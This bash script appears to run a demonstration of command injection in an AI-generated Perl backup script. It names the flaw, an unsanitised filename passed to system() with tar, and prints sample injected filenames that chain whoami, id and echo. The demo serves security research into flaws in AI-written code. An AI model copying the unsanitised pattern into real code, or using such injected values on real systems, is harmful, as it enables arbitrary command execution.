#!/bin/bash
# Perl command injection demo runner
#
# Demonstrates command injection in AI-generated Perl backup script.
# The AI passes filename arguments directly to system() without sanitization,
# enabling shell metacharacter injection for arbitrary command execution.

set -e

echo "Perl Command Injection Demo (perl_002.pl)"
echo "========================================="
echo
echo "Target: AI-generated file backup script"
echo "Vulnerability: system(\"tar -czf backup.tar.gz \$filename\")"
echo "Impact: Arbitrary command execution via shell metacharacter injection"
echo

# Check dependencies
echo "Checking dependencies..."
perl -v > /dev/null || { echo "ERROR: Perl not found"; exit 1; }
python3 --version > /dev/null || { echo "ERROR: Python3 not found"; exit 1; }
which tar > /dev/null || { echo "ERROR: tar command not found"; exit 1; }
echo "✓ All dependencies available"
echo

# Clean up any previous runs
rm -f backup.tar.gz rce_proof.txt

# Run the exploit
echo "Running command injection exploits..."
echo "====================================="
python3 exploit.py

echo
echo "Manual testing:"
echo "1. Normal usage:"
echo "   echo 'test data' > myfile.txt"
echo "   perl victim_module.pl myfile.txt"
echo
echo "2. Command injection:"
echo "   perl victim_module.pl 'myfile.txt; whoami'"
echo "   perl victim_module.pl 'myfile.txt \`id\`'"
echo "   perl victim_module.pl 'myfile.txt && echo pwned'"
echo
echo "Files:"
echo "- victim_module.pl: Verbatim AI output (perl_002.pl)"
echo "- exploit.py: Automated command injection tester"